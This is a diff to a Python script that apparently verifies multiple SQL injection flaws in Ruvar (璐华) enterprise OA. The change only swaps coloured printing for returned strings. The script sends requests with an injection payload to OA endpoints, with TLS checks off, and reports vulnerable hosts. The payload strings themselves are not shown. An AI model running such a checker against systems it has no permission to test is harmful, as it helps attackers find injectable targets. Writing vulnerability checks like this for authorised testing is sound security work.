@@ -8,8 +8,8 @@ description: ruvaroa多处SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class ruvar_oa_multi_sqli_BaseVerify:
     def __init__(self, url):
@@ -31,16 +31,16 @@ class ruvar_oa_multi_sqli_BaseVerify:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.status_code == 500 and r"GQXMicrosoft" in req.text:
-                    cprint("[+]存在璐华企业版OA系统多处SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在璐华企业版OA系统多处SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
             req = requests.get(self.url+"/include/get_user.aspx", headers=headers, timeout=10, verify=False)
             if r"button_normal" in req.text:
-                cprint("[+]存在璐华企业版OA系统POST SQL注入漏洞...(高危)\tpayload: "+self.url+"/include/get_user.aspx", "red")
+                return "[+]存在璐华企业版OA系统POST SQL注入漏洞...(高危)\tpayload: "+self.url+"/include/get_user.aspx"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = ruvar_oa_multi_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
